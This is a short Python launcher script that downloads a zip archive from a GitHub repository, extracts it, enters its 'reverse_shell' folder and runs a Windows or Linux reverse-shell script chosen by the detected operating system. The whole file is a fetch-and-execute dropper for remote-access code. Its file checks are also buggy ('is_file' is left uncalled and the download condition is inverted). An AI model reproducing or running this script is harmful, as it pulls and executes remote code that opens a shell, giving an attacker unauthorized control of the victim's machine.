from pathlib import Path
import subprocess
import time
import os
import urllib.request
import platform

url = "https://github.com/jhonnunes443/Security_folder/archive/refs/heads/main.zip"
unziping = "tar -xvf main.zip"
directory = "Security_folder-main/reverse_shell"
task1 = "python3 winshell.py"
task2 = "python3 linshell.py"


file1 = Path("Security_folder-main/reverse_shell/winshell.py")
file2 = Path("Security_folder-main/reverse_shell/linshell.py")
file3 = Path("main.zip")

def existing_file():
    if file1.is_file or file2.is_file():
        print("Changing directory.")
        os.chdir(directory) 
        print("#Running script.#")
        
    else:
        print("Failure to acess file.\n")

def executing_scripts():
    try:
        test =platform.system()
        if test == "Windows":
            print("Windows test sucessful, trying executing file...\n")
            subprocess.run(task1, shell=True)
        elif test == "Linux":
            print("Linux test sucessful, trying executing file... ")
            subprocess.run(task2, shell=True)
        else:
            print("None file was right.")
    except Exception as e:
        print("Fail to execute: ", e)

existing_file()
executing_scripts()

def downloading_file():
    if not file1.is_file or file2.is_file():
        print("File not exist. \n")
        time.sleep(1)
        print("Downloading file...\n\n") 
        urllib.request.urlretrieve(url, file3)
        time.sleep(1)
        print("Unziping file.\n")
        subprocess.run(unziping, shell=True)
        time.sleep(1)
        print("Changing directory.")
        os.chdir(directory) 
        print("#Running script.#")
        executing_scripts()
    else:
        print("Process fail.")

downloading_file()



